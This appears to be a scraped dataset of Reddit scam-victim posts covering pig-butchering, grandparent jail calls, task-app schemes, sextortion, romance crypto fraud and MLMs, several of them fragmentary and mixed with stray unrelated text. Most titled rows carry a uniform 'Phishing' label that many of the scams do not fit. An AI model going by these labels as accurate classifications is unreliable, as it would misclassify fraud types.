6. Your ""account"" gets frozen for defaulting on loans, not passing verification, whatever. You have to pay in 7 days before they start deducting 10%  everyday from your investment and ""earnings"".
7. One time you send a large payment, they hurriedly tell you that you sent to a ""retired"" address!!! Later they decide you can make up for it by paying a 'reduced' amount.
8. Even if you pay everything, they'll keep coming up with reasons to prevent withdrawals. But your investment inside has already doubled! So you can't give up... and they'll never run out of  excuses

When I said well-planned operation, everything has been [scripted and tailored](https://www.reddit.com/r/Scams/comments/njimju/pigbutchering_scam_sha_zhu_pan_photos_of_training/?utm_source=share&utm_medium=web2x&context=3) to  your stereotype. Whether you a new college grad who never had a relationship, a lonely urban professional, a midde-aged recently divorced doctor, they have scripts for that. Generally, if you're a man, the scammer shows lots of sexy pictures and act hot & cold. If you're a woman, the scammer showers you with corny cliches and sweet nothings. Even the timing of when to call you cute names is  planned (\~2nd week). They make you think you're making all the choices and ""mistakes"". Maybe you weren't so greedy for money initially, but they know human psychology.

They're not some small outfit but a sophisticated corporate operations linked to Chinese triads (mafia) syndicates. They have head offices and branch locations. They have IT/telecom department, finance/money laundering department, and a ""sales"" department -- the biggest in manpower-- who do the day-to-day raising of ""pigs"". They are salaried, have time-offs and get 10-40% commissions for successful slaughters. They have training [manuals](https://www.reddit.com/r/Scams/comments/njimju/pigbutchering_scam_sha_zhu_pan_photos_of_training/?utm_source=share&utm_medium=web2x&context=3) and scripts they [update](https://www.reddit.com/r/Scams/comments/nwz7ro/leak_of_a_new_script_for_pigbutchering_romance/?utm_source=share&utm_medium=web2x&context=3) every so often.

The Sha Zhu Pan industry is thriving so much there are markets for fake dating profiles (\~$20 for basic authenticated accounts to \~$100++ for complete package with pictures and social media history).

1683643269.0,Dad scammed by phone call out of $9500,"I tried posting this previously but it wasn't allowed due to foul language - I have since calmed down a bit.  Lets try this again.

On Saturday my (44m) 75 year old father received a phone call from someone purporting to be his grandson, my sisters son, who is about to start college.  Lets call the grandson Jack.

""Jack"", said that he is in jail and has a broken nose and is bleeding and needs $9500 to pay a lawyer or he'll be there for 3 days.

He told my dad to go to the bank, take out cash, come back home, and a driver will pick it up.

He did that.  BUT my dad is old, and my brother lives with them.  MY BROTHER, an adult, an adjunct professor at an accredited university (albeit he is heavily on mental health medication and recreational cannabis), drove my dad to the bank, let him take out the cash, and let him give it to the scammer.  At no point did either of them call me or any other sane member of our family.

Anyway, my dad called the scammer back.  They sent a 'Lyft' driver.  However, the first driver apparently refused the pick up.  they sent another driver who accepted the envelope of cash and drove away.

THEN my dad called me and told me what happened and he realized he'd been scammed.  

I lost my mind.  I literally just worked with a government agency about informing consumers about scams.  I LITERALLY just told him what to do if this EXACT situation happened.  I told him someone would call him saying they were his grandson and they were in jail and needed money immediately.  Apparently he forgot.  

Anyway, I understand that they preyed on my dad and used his fear to reduce his faculties so he didn't question this.  But MY BROTHER?  I still haven't spoken to him about this because I'm so angry.  How could he let this happen?  

I have no hope we'll get the money back - yes the police are 'investigating', but I know they're just going through the motions so they keep their jobs.  I'm just so angry at the impact and trauma this has had on my dad, my family, and me.  It strained relationships that didn't need that.  

How am I supposed to come to terms with this though?

UPDATE: probably wasn't my brother.  Due to his personal experiences he thought the situation was plausible and thought he was helping his nephew out.  He realizes how stupid it was.  (This was what I thought).  But very disappointing.",Phishing,2355,433,69,1

first off I‚Äôm not from a well off family at all, actually my mom struggles to pay rent every month and recently divorced my stepdad because of money problems.. so I worked full time during high school and saved up at least 10k(all my money). then I started looking into investments and I ended up going into this day trading.  the people I met IRL presented and basically sold me on how you can make money everyday from your phone by buying this course, learning trading techniques, and then putting money onto the trading site (Binarycent.com) so I did. I ended up putting a lot of money into it but never tried taking it out. I kept ‚Äúlosing‚Äù all my money then finally I tried taking out 3k. it wouldn‚Äôt let me withdraw and then I got locked out of my account after contacting the site multiple times. 

it was really hard to accept that I lost that much money. I would cry at work and think about how I could‚Äôve just gave it to my mom. or how great my life would‚Äôve been if I didn‚Äôt meet those people who introduced me to that. or be more cautious with where I put my money into. I still have a lot to learn, I always get scammed because I‚Äôm gullible and tend to see the best in people. I felt so depressed for weeks, but eventually I picked myself back up. I used that as fuel to find out ways to make that money back as soon as possible. side hustling, as well as DoorDash delivering, flipping cars. I‚Äôm about to end off the year with 30k..from working full time and then delivering after work during all of summer, and then just full time during community college. the only way I overcame feeling like my world stopped spinning was by making it my goal to make my money back in the shortest amount of time. 

that was my experience (there was much more) but I‚Äôm scared it will happen again. I would never forgive myself if it did. I learned to not trust easily, if at all. i really gained trauma from these scammers and it‚Äôs sad I had to learn this lesson for such a large price.. I hope this resonates or comforts anyone who is going through something similar.

Someone will reach out to you and tell you that if you work remote on their app daily for 5 days you will get $500 and then they will help you create an account and run you through training and show you that in wallet you get some money and you make commission on performing tasks.  


The working of this app is that you get some amount in your app wallet and perform a submit task where you invest some money into the app and within few seconds it returns the amount with some commission of 0.06%. 

Once you make some commission they start hitting you with auto double submissions and send your wallet address in negative. As you do generate some commission they send your account in negative and support will tell you to invest your own money in there to make it balance again which you can take out after task. 

It works okay till its 20-$30s but soon it becomes double and double and leads to hundreds and thousands. The number keeps rising on each task and they keep sending you in minus and keeps asking you to add more so you can finish you task and take out but as there are 40 tasks and you get double every few time it can end up thousands in minus and either you keep feeding them or you lose what you have invested already. 

&#x200B;

They ask you to borrow money from friends or any one and just keep feeding their platform.

I don't want to deny my daughter the chance to meet her friend if she really is legit‚Äîbut my ""don't meet strangers off the internet"" alarm bells that were drilled into me are going off.

Apparently the girl's parents want to have a video call with all of us (them, their daughter, me and my wife, and our daughter) first, and then meet for lunch at an Applebee's halfway between us. I know it would be easiest (for me) to just say no, but she has been HOUNDING me to be able to meet her friend, and says she and the girl have exchanged pictures of them doing specific things (like having a tissue box on their head) and that she knows the difference between a girl her age and a weirdo pretending. I don't see the angle of how a scammer would benefit from chatting and roleplaying horses for a whole year just to meet a kid in public with her parents, so I wanted to see if this was a known scam.

1697318165.0,Is Etsy.Arago.Store A Scam?,"So I recently started up a new Etsy store and added a new product and a few minutes later I got a notif that I got a new sale.

I haven't received any orders yet so I'm unsure if it is a scam or legit. I'd also like to add that the order notif isn't even popping up in my dashboard on Etsy itself, just the Arago site.

Expedited packages however debit standing balance, requiring a recharge. Payment are via crypto though interac is available at higher tiers after recharge amounts are reached (which also increase the commision percent to 2.5%). Payment is completed via a chat with customer service and screen shot of recharge, which returns account balance to positive to proceed, with higher commission added to new total. This new total then sets the available price on the next package in line additively.
After completing all sets, training account is withdrawn and 18% of earned commissions transfered to a personal account. Complete sets and recharge for personal account and withdrawal to crypto wallet. First day was 170 USD, no issues.

In group chat, totals seem to range from 1500 balances to over 5000, with commissions between 1 to likely 3% of total. Account cannot be withdrawn till all packages are completed no refund or reset potential by customer service.

Not sure if this or something like it has existed and shown as a scam before, seems that the company is real, and has a low review rating and poor customer refund experiences, though other travelers us the company offerings legitimately.

In my case, I was hit with 7 EP, debiting higher and higher amount required to recharge, which subsequently added higher travel packages and EPs, for even higher packages and EP. Currently way over my head with money tied up, and the last EP requires 6000 USD. Group chat notes just powering through.

No signs or notes of the job online, but also no reference to it being a scam. Others seem to have no issue withdrawing, and personal messages with group members reflect this.

If anyone can weigh in, it seems like a bait and switch to escalate from small to larger amounts and hard to get any info on it.

1697176564.0,Dad getting scammed? Can't remember by who or how,"Okay so, my mom passed away about five years ago and I (29M) have been helping my dad (63M) raise my special needs brothers ever since, they're teens now but not remotely independent. My Dad lives off of disability money and a state issued stipend for one of my brothers due to his special needs.

Since she passed away, he's been spiraling privately. He was always too busy to really be *online* that much when my mom was alive, but he bought himself a laptop and has been *VERY online* ever since. He's speedrunning every single scam and money trap that most people in my generation learned to watch out for one at a time as we grew up with internet. I luckily stopped him from giving out his SSN to a random on facebook who claimed to be able to help him with state assistance. I only even knew this was happening because I glanced over at his screen as he was typing in his SSN and I flipped.

So much other stuff has happened. But him with the internet has felt like a child with a loaded gun. He recently pulled out over **two thousand dollars** and transferred it across a chain of accounts until it landed in cashapp, where bitcoin was purchased with the money and then said bitcoin was immediately withdrawn. Now, the tricky part is- my dad has always had like splitting blackouts where he'll do things and then have no memory of doing them, especially under stress. My mom's passing triggered this in the extreme. If I'm to take him at his word, and I really have no choice here- he doesn't remember why or how he did any of this. Let alone where or who the money is going to.

Going through his cashapp history, this has been happening in various amounts over the past three years, maybe more. We nearly got evicted this month because rent money disappeared in this fashion.  I covered it myself, but can't always afford to do so. The chain of transfers makes no sense, but he had to be complicit because it starts with a cash withdrawal from his main bank. I firmly believe he's being taken advantage of. I could just step in- wipe his laptop, wipe his phone, disable any compromised services and accounts, but even on his cashapp there's registered devices from other states and some that are altogether ""unknown"". I don't know the extent of how badly things are compromised here, but he's surrendered all his devices to me, and he's consented to having me handle this however I see fit. **I just want to know if I have any grounds to dispute these transfers.**

It's from *bank 1 to paypal*, from *paypal to bank 2*, from *bank 2's debit card to cashapp*, from *cashapp to bitcoin* and then it's immediately withdrawn into one of a few bitcoin wallets. Some are recurring. Others are not. I'm panicking here, there's over ten grand here over the past couple years. And for a family that's living paycheck to paycheck, with help from relatives sometimes- this is catastrophic.",Phishing,2889,522,70,1

Adam Aron, the controversial CEO of meme-stock darling AMC  Entertainment, sent sexually explicit images and text messages to a  woman he thought was a ballerina who had done ‚Äúunmentionable things‚Äù to  him, according to a bombshell report.

Instead, the woman turned out to be a 34-year-old Bronx con artist  who catfished and attempted to extort the married executive, Aron  admitted Thursday after the news site [Semafor](https://www.semafor.com/article/10/11/2023/amc-ceo-adam-aron-amcs-ceo-shared-sexually-explicit-photos-and-texts-in-blackmail-plot) reported the sordid tale.

Paragon Communication Inc is a market leader in re-manufactured electronics, managed services, supply chain and

Through the loyalty of our customers, our business expanded rapidly and in 2003 we founded Summatis Inc, a Nortel

Elite Advantage Partner to support a growing number of End User Clients in the North East. In 2005, we founded

VertiCall Inc to focus on the sale and support of Avaya Channel Partners while leveraging Paragon‚Äôs core principles

of success. In 2008, Paragon Communications was named by Nortel Networks as the Authorized Remanufacturing

Partner for their Channel Partner community. In late 2009 the merger of Nortel Enterprise and Avaya led to expanded

opportunities for Paragon, following the successful sale of Summatis to Xeta Technologies we integrated the VertiCall

team into Paragon to better serve our OEM and VAR customers.

OUR VISION: Paragon Communications is dedicated to excellent and professional service. Our employees are

supported in their goals by a company culture promoting individual growth and the development of new business

1697212463.0,Odd Scam Experience Involving Bluehost,"Still scratching my head about what the point of this scam was but hoping someone else here can shed some light.

Basically received an email stating ""thank you for registering these 10 new domains"" from Bluehost and since I've done nothing related to that site in probably 8 years I immediately knew something fraud-related was going on. I accessed Bluehost directly instead of using any email links and found my account password had changed and an authenticator token had been put in place as well. After working with their customer service I was able to get full access back to the account (randomly generated password, authenticator app) and began to assess the damage.

I am now the proud-ish owner of the worst 20 domain names I've ever seen but there's a catch...the card they used to buy these sites isn't mine. So what the hell was the point of this?

My credit report shows no new accounts so I can assume a card wasn't taken out in my name, and all other accounts that have any financial implication have been 2-factor locked for some time now.

Genuinely curious if anyone has an idea of what the point of this was outside of the 15+ calls I've been getting from companies hoping to help me ""scale my new business""",Phishing,1226,218,22,1
1697571564.0,Kerfcase are scammers!,"This company, Kerfcase, appeared to be a legitimate company, making high-quality wooden phone cases. I haven't found it on any scam sites and there are a number of reviews on different sites posted about it. They have a mailing address, phone number, and a professional-sounding answering message when you call. Their website is well-designed and has an interactive instant-messenger run by an AI.

The only clue that this company might be a bit flaky was a note on their website to allow five days after ordering for a phone case to ship, as they are all custom-order and it is a small company. If you do not receive an email that your phone case has shipped within five days, the note says, send them an email.

On October 3rd I ordered and was charged for a $64 phone case - expensive, but it's custom-made, you choose the wood, and it's plastic-free and sustainable so the price itself didn't raise red flags. I received an email with an order number immediately.

After a week, no email, so I tried to track my order using their instant messenger AI. The AI said they had no record for my order number. I emailed and sent a message using a form on their website. No answer. I have called several times daily during their office hours but no one has ever answered and they have never returned a call. I messaged their reddit page and commented under a youtube comment supposedly by their CEO under a product review. No response. I tried to leave a review but there is no form to enter reviews on their site despite their site showing dozens of customer reviews. Their product isn't available on Amazon so you can't leave reviews there, either.

Ok. Well, if that is the   case, then I will just keep my account open. I re-read the contract I signed   with Vasa and you are in fact correct that you are under no obligation to act   in a civilized, fair, or in any manner at all that even remotely resembles integrity.   With that being said, I did not see anything in the contract stating   customers are not permitted to take a shit in the gym's pool.  
I imagine that most people have enough integrity to no do so, but it is   obvious that integrity is not valued by Vasa. I have never shit in a pool   before, but I imagine it would feel pretty liberating. No hard, cold toilet   seat. Not having to use some abrasive paper to cleanse yourself. The idea of   it is actually extremely appealing.  
I look forward to being apart of the Vasa family, and cannot wait until your   doors reopen.

Warm regards.

After hearing this I suspected something and told my husband to not send money to them if they come back saying we sent too much money or you need to pay so and so for shipping stuff to you as this is a signature scam move. He nodded his head and walked away. Guess what he did about an hour ago‚Ä¶..he sent them $$$ via zelle with out checking with me. When I got the text notification i immediately went to him and asked why he did that and his response was the check was cleared so why not!! I told him the bank can come back and take funds for a bounced check for up 5 to 7 days which most likely will happen in this case and he is in a shell shock now. I called our bank and reported a clam on zelle but I doubt they will do anything.

1676468362.0,That time I got scammed by a cat magnet,"This was back around 2004. I was looking for a job in the newspaper, and came across an ad for a work from home opportunity. It was for creating artisan cat magnets. God it sounds ridiculous typing it out but I was 16 and desperate for a job. 

So for 40 dollars, they send you a starter kit with detailed instructions on how to make the magnets. Then you send the magnets back and they ""sell them"" God knows where, I can't remember. So I sent them a check for 40 dollars and they *actually fucking sent me the materials*. 

After the starter kit magnet was made you had to send it back for inspection, then you could purchase the actual materials to make dozens. I can't remember the price but it was a decent amount of money. They promised you'd make hundreds of dollars a week.

I never bothered sending the starter magnet in for inspection, because it took me four hours to make, it was tedious and ugly as shit. So I was only out 40 bucks and I learned a valuable lesson about *exciting work from home opportunities*.

1684935050.0,I got blackmailed over snapchat last night and this was my experience.,"I met a girl from a dating app last night and added her on snapchat to get to know her. She asked how old I was and when I replied 19, she said that she was also 19. She told me she had just gotten nose surgery so she looked awful but she had an instagram that I could look at. The instagram looked real with real followers and real posts that matched her profile on the dating app. She also had a high snapchat so I was confident it was a real person. After things start heating up, she asks me to send a photo of how big i was. Normally I don‚Äôt do this kind of thing but for some reason last night I was intrigued. The photo I sent wasn‚Äôt even a nude, and she immediately screenshotted the photo and threatened to send it to my family and friends which she found from my instagram. I was told I had the option of giving the username and password for my snapchat, pay her for a dress, or she would dm 50 people exposing me. She also told me she was 17 even though she told me the night before that she was 19 and she lied about her age on the dating app. I was completely stuck with no way out and was panicking. I agreed to pay for the dress which she ended up making me pay 100 dollars for. I don‚Äôt have that much money at this point of my life but i agreed and paid just so it would all be over. After i sent the money she mocked me asking if I thought we were done even though she had promised that she would delete the screenshot and leave me alone. I ended up paying another 165 and had to beg and negotiate down from another 250 because I only had 166 left in my account. She took all the money on my debit card. The worst part was sitting there while she manipulated the fuck out of me knowing there was nothing I could do. After paying the second charge, she deleted the screenshot, but threatened me saying if there were any problems she would have her brother recover the photos from her icloud even after they were deleted from recently deleted. Is this possible? Also are there any steps I should be taking? I wanted to write about it to spread the word about these types of scams and ease my anxiety a bit. Although the money went through, It hasn‚Äôt been deducted from my account yet and I‚Äôm worried there will be some problem and she will release the photo.

UPDATE:

The scammer has been blocked on snapchat, I changed my snapchat username, and disabled my instagram (they blocked me first so I couldn‚Äôt find the account). I‚Äôm glad I found this group and decided to post because it showed me how stupidly I approached the whole situation.

1696959571.0,Lost 30k from a romance scam. Can finally move on.,"So I'm (28m) finally at the end of a five month scam that finally ended because of this subreddit. I sorted by top and realized some of the best scams overlapped with mine and contained similar elements. It's not a 1:1 story because I had to take a mental health break and I wiped my computer and phone once I found out. Not all details will be here but the spirit is the same:

A text sent to the ""wrong number"".

An extraordinarily hot chinese-american woman, 38, that had her own business, looked independently wealthy, with a great personality. (I had a type and this person just happened to 100% overlap with it.)

Happened to be single, an immigrant that came to America a bunch of years ago, and was just coming from a divorce. A bit of a red flag, but whatever, she didn't have kids anyway. I wouldn't hold it against her.

**The Open.**

I never realized before that a text sent to the wrong number could be the cold open to a scam and so we begun talking and things hit off. She introduced herself and while her writing wasn't 100% since English was her third language, it was believable enough for me.

Things hit off well, she gives me her telegram, and we begun chatting further. We swapped pictures and I told her something along the lines of ""If we weren't a few states away, I would've already asked you out on a date.""

Surprisingly, she said we were a bit far but there's no reason why we couldn't get to know each other. I didn't like the idea of a long-distance relationship but we were both adults and had money (lmao) so I figured why not? We could make it work if it was meant to be.

I started this with a single rule that I ultimately broke:

I would not touch any money until I met her in person.

At this point, we were one month in the scam and I was getting lovebombed pretty hard. We got along really well and for some reason, she was like one of the few women I met that was consistent, shown up when they said they were, and held down a job all the while. I thought I found the one because everything I've seen so far was exactly what I like in a person in general.

A month in, she confesses her love and I admit the same thing to her, although we were going a little fast. We eventually agree on having a vacation on Singapore for our first date. It wasn't really absurd to me at the time because she looked extraordinarily wealthy. I definitely could afford a passport and relocate.

**The Actual Scam**

While I was busy getting my things together for a passport she finally opens up with a few exploits from her daytrading in cryptocurrency. She was pulling in pretty impressive amounts and wanted me to get in on it.

I told her: Sure, I was interested but I'm not touching any money until we meet in person.

She then proceeded to constantly bug me and show me the gains she was getting from her trading. I eventually caved, threw in 200$ in BTC, and she makes me an extra 100$ through this mock website of an actual website. 

I apologize for doubting her.

She got upset, berated me, told me that she was polite to me up until this and she gets very emotional when people begin doubting her.

I told her I wouldn't doubt her again.

I take 3000$ in credit, turn it in BTC, and she puts in 9000$, and we suddenly had a lot more money to work with. I was pulling in thousands of dollars a day through this website and over the course of one month I had 40,000$ in profit. I could actually afford college and work my way into a position where I was just as successful, if not more, as this lady, and our relationship would actually last long-term that way.

Now to withdraw the money.

She started showing me how to do this over telegram via a series of screenshots and I followed her instructions exactly. I hit up ""customer support"" and suddenly I'm on the hook for a 20% deposit, but I'll get that money back but this person that was going to buy the bitcoin for the withdraw also was going to do the same.

Do I know who? No. 

Do I even know the custom service's representative's name? No. 

Did they even have a manger I could talk to? No.

This website even has a few misspellings and it doesn't go back to the official website in anyway.

20% deposit due within two weeks.

No big deal, we make the amount in three weeks and got an extension at some point so there was no late fee. I owe her 10k now.

Then I ""accidentally"" messed up the BTC address by the last digit to withdraw my money. I find out after obsessively checking it and I thought it was gone, but I asked customer service, waited an hour, and they managed to stop it just in time!

Another 20% due within two weeks, but you'll get your money back I promise.

We make it in 4 weeks.

Cool, here's a late fee. Fix it in two weeks.

I pay the late fee weeks later.

I felt so obligated to keep going on this increasingly dumb loop of paywalls because I **needed** to recover **her** money back that I never once begun to ask about myself. I was so utterly convinced of her existence that I never once considered my own well-being in this whole process.

I eventually begun to run out of money and then her tune changed from ""lets not talk to anyone about this"" from the very start to her wanting me to hit up my friends and family. I'm so grateful I haven't told anyone about this or asked anyone for money because I was really, really depressed and was undergoing a personal hell of having my ""girlfriend"" constantly reminding me that I was ""supposed to be a man"" constantly reminding me of how this is my fault.

When I confessed to her I wasn't feeling too well, she started to grow extraordinarily mean to me, telling me how she needed her money back and how she was due taxes and she wouldn't ever take ""no"" for an answer. 

I was out of money, my credit was tanked, and I couldn't get balance transfers. I had only a few options left:

Hit up friends/family (no)

Take a title loan. (how will I work?)

And I proceeded to do none of those, thankfully. I was begin questioning that if she was worth this commitment and was wrestling the idea of not honoring repayment I owed her. I had plenty of depression naps, phone calls, and watching letsplays after work.

Finally, I secured a balance transfer for 5k, took out a cash advance on another card, bundled it up with what little money I had left, and paid the last fee I ever needed to pay before the massive amount will get transferred to my account and everything works out in the end.

That's nice, but the authorities have all determined that due to the previous late payments, wrong address, etc, etc, etc, etc that your credit score is now 95 and you need to pay 5k to bring it back up or else you can't withdraw from this website.

I apologized to my girlfriend, told her I give up, she deserves a man with more money than I, and then proceeded to ghost her for what was supposed to be a few days but turned out to be forever.

**Epilogue** 

It was at this point that I was able to reflect on how shitty I was treated the last couple of months and then looked through scams on this subreddit and realize a lot of it was similar to mine. In fact, there was another subreddit that had a very, very similar situation to my mine and I was able to finally move on.

Despite being 30k in debt, I'm actually way happier now. It feels like breaking up with an abusive ex and it all becomes clearer. 

I never owed her 16,000$, it was all part of the scam.

I never messed up the address and the bitcoin was never recovered, it was never there.

The text I accidentally got sent came from a number that doesn't even exist in an area code that doesn't even reflect the same area she claimed to be from.

I felt suicidal back for the first time in my life then from my own incompetence and how I ruined such a perfectly good relationship. Now I just realized I was taken for a ride and there are genuinely evil people out there and while I should've stuck to my rule, anyone can be taken advantage of like this if they press the right buttons.

It'll be rough to recover, but at least I got scammed now. I couldn't imagine what it'd be like to be late in my career, in a well paying job, with a lot more income than just 30,000$. At the absolute latest I'll get this paid back in three years and I'll never forget this.

If you read all of this: Thank you for your time. The damage that was done was self-contained and I don't really want to talk about it, especially with friends and family, nor do I want my coworkers to know because I know my boss will take advantage of someone indentured like this.

1681998661.0,I think a man I was dating in real life tried to scam me - does this sound like a conman?,"I met this man 2.5 months ago on the league (dating app). He said he had a high profile career in asset management, and while I was able to see a tiny bit of a digital footprint, it was very limited. 

For the first month everything seemed fine and normal, but I started to doubt his sincerity in the middle of March. At the beginning of April, he told me that due to a deal he was brokering between government entities in China and Sultan Al-Maadeed of Qatar, the Chinese government had accessed 3rd party data on his cellphone, determined that he and I had been spending a lot of time together through that data, and somehow was able to run a ‚Äúcheck‚Äù on me. They apparently needed to make sure that I had no connections to government or business officials in the United States that would interfere with the success of this ‚Äúdeal‚Äù. He warned me that I might be receiving phone calls from Shanghai or Beijing and to not answer. 

When I pressed him on this later, because it made no sense to me, he changed his story to last year his ex girlfriend tried to expand her business to China, but it failed and due to that the Chinese officials contacted him to ask about her directly, and he just told them he wasn‚Äôt with her anymore and was with me instead and then gave them my info and they ran a check on me. I started to feel like I was being setup here, like china was going to be this big, scary entity that he could possibly use to justify like, weird requests or something. 

Anyhow I pretty much told him ‚Äúlook if this is some tinder swindler bullshit I have nothing‚Äù and while it caused some strife for a few days that died down. However last week, after one of my kids had a medical crisis and he wasn‚Äôt particularly helpful, I dumped him and then blocked him because I needed the space. He started emailing me and in one of the emails he offered to send me $15k to help with medical expenses, he just needed my bank account info. (His exact words were 'I can transfer or provide account info, your call.')

I immediately said no, because I didn‚Äôt feel like it would be appropriate to accept his money, but after awhile I started to feel really uneasy about the idea that he‚Äôd ask for my bank info and not just Venmo or something?

In the 2.5 months we dated, I only ever met him at hotels, from our very first date either family members were staying at his place, it was messy, or then it was unfurnished cause all his stuff was in storage, and then he broke his lease early because he didn‚Äôt like the building. He claimed to own a house in another town, but had friends renting it out. I never met his friends, family, co-workers, and he was very terrified of me being added to his social media, though he happily met my friends and was going to go to a wedding with me this weekend until I dumped him last week.

1622814855.0,Update 2 to: My mum (77) is currently at a hotel in the airport flying out to Nigeria.,"Edit: [Link to original post](/r/Scams/comments/nqgjy0/my_mum_77_is_currently_at_a_hotel_in_the_airport/)

OK, lots of developments since my last post.

First I'd like to remind everyone that this is happening in the UK.  A lot of the replies I had were giving US-centric advice, which I know came from a good intention and I thank you for that but please take our location into consideration when providing advice.

I had been tracking her phone yesterday, saw it moved from the hotel into the airport, and then went offline.  I assumed this was her getting on the flight.

I had a call from an officer at the airport yesterday evening.  She had been denied boarding at the airline because she had not completed a visa.  She thought it was something she could do on the plane, or when she landed.  The police became involved and went through the same process as all the other times she's recently had police intervention.  Again, she has convinced them that she is in full control of her faculties, she knows what she is doing and is certain she wants to do it.

So she's checked back into another hotel at the airport, and will begin the act of obtaining a visa.  I'm not entirely sure of the process for this but if it involves a visit to the Nigerian Embassy in London then I hope they will be able to see what's going on, assuming she tells them the truth, and perhaps deny her a visa or at least add themselves to the long list of people who have told her she's the victim of fraud.

She's still not answering our attempts to call her but has begin responding to text messages, so that's good.  Family are all trying to stay positive and friendly with her despite us being extremely angry, just one of the several stages of grief we've all experienced this week.

Our conclusion is that we cannot stop her.  She is determined this is what she wants to do, and is totally convinced it is not only the *right* thing to do but the *best* thing to do.  She has been convinced that we do not love her, and it is to our benefit if she leaves.

... 6 hours later ...

At this point I had stopped writing this update because a message came through on our family WhatsApp group from my younger sister:

""Mums on the phone she's coming home has realised it's a scam""

My older sister asked:

""Why does she think it's a scam now?""

And the reply:

""None of her cards work, and I think she's sussed it with all that's happened.  Hotel are talking to police now.""

So my younger sister and my older brother jump in a car and start driving to London.  They have since arrived and met with mum and the police, and I'm not sure exactly what's going on until I get an update from them.

The police are trying to recall the package of personal items she shipped through an international courier.  I'm still not entirely clear what happened with the bank today, whether the scammers took money, or my mum transferred it, but however it's happened the transaction either failed or has since been reversed by the police working with the bank's fraud team.

A recent update from my sister says:

""Got her.  She still believes he was not stealing from her.  The only reason the bank stopped the payment is because she'd put the wrong address!! ü§¨ü§¨ü§¨""

I have called Victim Support but, just like the police, they can't really do anything unless the victim themselves consents.  The local office is closed for the weekend so it will be next week before I can sit down with mum and talk to them.

Mum is going to stay with my sister for 2 nights, but then my sister has to isolate to prepare for surgery next week.  We'll get mum back into her flat and I will stay with her for a while.  Can't do that forever though, I have my own life, family, job.  We need to undo all the harm she's done, contact all the companies she has ended contracts with, reverse change-of-address details, and quite possibly find her somewhere new to live now that most of her money is gone.  

When I get the replacement Lasting Power of Attorney papers though I will be enacting them to the full extent and taking control.  I will need to treat her like a child when it comes to internet access, and for her access to money.

This is just the beginning of rebuilding her life.  There's so much more I've not even written in these posts yet, and I'm certain there will be more to come.

Thank you for reading this and thank you to everyone who has taken the time to reply, offer advice, or just offer words of sympathy.",Phishing,4477,815,117,1
1689986740.0,Mom is forcing me and my sister to get into an MLM scam,"Hi guys, I need some advice! I don‚Äôt know if it‚Äôs a good idea to post here or some other subreddit. 

My mom called me a couple of days ago about getting into an investment bank and I didn‚Äôt think much of it first, but it looks like she signed me and my sister up without our consent. She was recruited by a ‚Äúgood friend‚Äù from her workplace and now she‚Äôs completely brainwashed.

I think she might‚Äôve put $450 (or more, she might‚Äôve been lying) into the company already and she was telling me about the company and saying something along the lines of ,‚Äúthe money will double or something by the time she takes it out, something about getting certificates, blah blah.‚Äù I honestly could tell something was up and when I looked up the company on Google, the first thing that came up was that it was a scam. I think the company is called GSpartners or something. 

Now she‚Äôs asking for our IDs, and from the looks of it, they‚Äôre asking her to send a photo of me and my sister‚Äôs IDs (front and back) and one of us holding it up to our face. I‚Äôm so frustrated and I want nothing to do with this. I‚Äôve already told her multiple times that I don‚Äôt want to send them anything, sent her multiple articles about how it‚Äôs a scam and now she thinks that I‚Äôm ungrateful. She can‚Äôt proceed without our information fortunately, but unfortunately, she‚Äôs nagging me to send her my ID literally everyday. 

I‚Äôm so worried for her, I feel like she‚Äôs going to go to other scammy companies to do the same thing and lose a ton of money. I‚Äôve called family members to tell them what‚Äôs been going on and everyone is stumped. Not only that, but I think she‚Äôs going to hold this against me for the rest of her life, she‚Äôs said some pretty nasty things to me because I told her I didn‚Äôt want to do it. What do I do? I feel like I‚Äôve done the best I can and I‚Äôm stressing out so much. I really care about my mom and I cannot imagine us on bad terms long term.


UPDATE: Thank you all so so much! I didn‚Äôt expect to get a ton of advice. This is all so helpful, I didn‚Äôt realize how deep my mom was into this scam. I need to act now before it gets worse. My sister and I are planning on holding some type of in person-intervention for my mom so we can try and convince her one last time. I‚Äôve already done the proper measures that I can to protect myself and also let my sister know to do the same as well. Again, thank you all!",Phishing,2397,467,42,1

This person asked me to send them a picture of the scratched gift cards once activated. But I did find out from a  colleague that they had the same message and it was a scam. Seeing this, I did thankfully not scratch the gift cards and I even have all receipts available. 

This morning I tried to return the gift cards through the store I purchased them from and they said they couldn't do it (despite the receipts saying you could as long as its within 35 days) I have called boots customer service, who said they could not perform a refund either and then directed me on to apple, who then said the only way I could refund them is through the same boots store i purchased them from.

My hypothesis: Whoever this is, scanned the gift cards and have likely long left the premises, and whoever uses the machine next either (1) notices the gift cards on the machine readout and asks the employee to void them or (2) doesn't pay attention and pays so quickly that they end up activating the card for the person who is long gone, and ends up footing the bill.

1697111947.0,"Beware of Fake Social Media ""Teachers"" Such as Shruti Pangtey Founder & CEO at Digital Empires"," Hey everyone,

Just wanted to share an experience I had and hopefully help others avoid the same pitfalls. I was on the verge of buying a course from this particular individual when I quickly realized I was about to get involved with a ""wanna-be"" teacher. I found her on social media and, half-jokingly, asked, ""Where can I find 66 people to sell content?"" To my surprise, she screenshotted my question and posted it on her Instagram story, shaming me in front of her alleged 80k followers (which I suspect are mostly purchased) and suggested TikTok as the answer.

I kindly asked her to remove my personal details. Instead of respecting my privacy, she blocked me, keeping the content up. Now, any legit social media influencer or course seller knows the drill: either get approval before showcasing someone or, at the very least, hide their details when mentioning them publicly.

I took my grievances to Trust Pilot. She initially responded, saying her ""team"" was on it and there was no issue since everything was in the public domain. But let's be honest here‚Äîany professional PR team would prioritize ethical communication and proper English. She later removed her comment and flagged my review as ""illegal"". Now Trust Pilot is on it.

And get this: if you do a deep dive on her LinkedIn, it seems like her ""11 employees"" are just made-up profiles to boost her online presence. Her Instagram? Probably packed with fake followers. And her traction on other platforms is less than impressive.

Honestly, she might be a decent graphic designer, but it seems she's also utilizing something like Chat GPT for content. I have a hunch that she'll flood her Google reviews with more positive ones to counteract any negative feedback like mine.

For those on their digital journeys, especially the newbies: **always vet** who you're learning from. Research is key if you're serious about your growth.

The sender was USPS MDC TK from Topeka, Kansas. I tried looking up similar situations, but everything I found was linked to Medicare fraud and I‚Äôm not anywhere near 65.

1697209620.0,I dunno if this is a scam or not but it‚Äôs really confusing,"A few months ago, I think in April, a random number texted me something along the lines of ‚ÄúHello there, I might have gotten the wrong number.

Then I just deleted it off of my phone like I usually do with unknown numbers. Before that, I did a short background check on this person and it‚Äôs not on any spam sites.

